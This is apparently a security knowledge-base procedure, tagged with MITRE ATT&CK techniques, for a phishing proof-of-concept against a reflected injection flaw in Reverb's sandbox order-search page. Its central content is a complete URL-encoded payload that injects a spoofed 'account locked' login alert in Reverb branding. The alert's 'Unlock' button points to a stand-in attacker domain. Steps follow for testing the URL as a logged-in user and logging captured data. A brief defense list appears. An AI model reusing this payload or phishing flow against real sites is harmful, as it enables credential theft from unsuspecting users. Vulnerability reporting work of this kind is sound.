---
tags:
  - xss
  - poc
  - phishing
  - exploitation
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Phishing]]'
updated_at: '2025-12-14T03:47:12.616Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques:
  - '[[T1566.001]]'
id: db96aa7f-969e-4a88-a5be-24f65d99d3c7
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Phishing]]'
---
# Demonstrate XSS Impact with Phishing POC

## Summary

This procedure assembles and tests a complete proof-of-concept (POC) URL exploiting the reflected XSS to display a spoofed login alert, demonstrating how attackers can phish Reverb users into visiting malicious sites for account takeover.

## Description

The POC combines the crafted payload into a shareable URL targeting logged-in users on vulnerable pages. When accessed, it renders a fake "account locked" message using Reverb's branding, urging clicks on a phishing link. This highlights the vulnerability's severity for credential theft or session hijacking. Testing involves victim simulation to validate impact without real harm.

## Requirements

1. Encoded payload from previous procedure.
2. Control over a malicious domain (e.g., badwebsite.com) for link testing.
3. Test account on Reverb to simulate victim interaction.

## Defense

Defensive measures and detection strategies:

- Deploy web application firewall (WAF) rules to block HTML in queries.
- Educate users on phishing via branded alerts.
- Analyze user agent and referrer logs for suspicious POC-like accesses.

## Objectives

1. Create a functional POC URL for vulnerability reporting.
2. Simulate phishing to show real-world impact.
3. Validate potential for account information theft.

## Instructions

### Step 1: Assemble POC URL

**Context**: Integrate full encoded payload into target endpoint.

Build: https://sandbox.reverb.com/my/buying/orders?query=%3Cspan%20class%3D%22bottom-alert%20%20videos-header%22%3E%3Cstrong%3ELog%20In%20to%20Reverb%3C%2Fstrong%3E%3Cbr%3E%3Ccode%3EDue%20to%20multiple%20unsuccessful%20attempts%20to%20login%20to%20your%20account.%20Your%20account%20has%20been%20locked%20for%20your%20protection.%20Please%20click%20below%20to%20unlock%20it%3C%2Fcode%3E%20%3Cbr%3E%3Cbr%3E%3Ca%20href%3D%22http%3A%2F%2Fbadwebsite.com%22%3E%3Cspan%20class%3D%22btn%20button%20button--orange%20button--wide%22%3EUnlock%3C%2Fspan%3E%3C%2Fa%3E.

> Expected: URL ready for sharing or reporting.

### Step 2: Test POC in Browser

**Context**: Load as a logged-in user to confirm rendering and interaction.

Open the URL in an incognito session with Reverb login; observe the alert.

> Expected: Spoofed content appears, link is clickable.

### Step 3: Simulate Impact

**Context**: Verify phishing flow by clicking and monitoring destination.

Click "Unlock" and check if it redirects to http://badwebsite.com; log any captured data.

> Expected: Successful redirection, demonstrating theft potential.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[Phishing]]

### Sub-Techniques

- [[T1566.001]]

## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[poc]]
- [[Phishing]]
- [[exploitation]]
